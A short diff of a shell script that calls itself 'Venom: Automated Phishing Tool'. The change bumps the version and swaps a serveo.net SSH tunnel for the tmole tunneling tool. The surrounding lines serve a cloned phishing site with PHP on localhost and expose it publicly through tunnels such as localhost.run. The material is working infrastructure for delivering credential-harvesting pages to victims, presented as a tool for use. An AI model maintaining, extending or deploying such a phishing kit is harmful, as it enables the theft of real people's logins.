@@ -2,7 +2,7 @@
 
 ##   Venom 	: 	Automated Phishing Tool
 ##   Author 	: 	https://t.me/nullxvoid 
-##   Version 	: 	1.0.0
+##   Version 	: 	1.0.1
 
 # Checking Internet connection
 
@@ -359,7 +359,7 @@ hosting(){
   php -S localhost:8080 -t .vnm/$website > /dev/null 2>&1 &
   sleep 2
   printf "Starting tunnulmols tunnel...\r"
-  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
+  tmole 8080 > .srvlog 2> /dev/null &
   sleep 3
   printf "Starting localhost tunnel...\r"
   ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
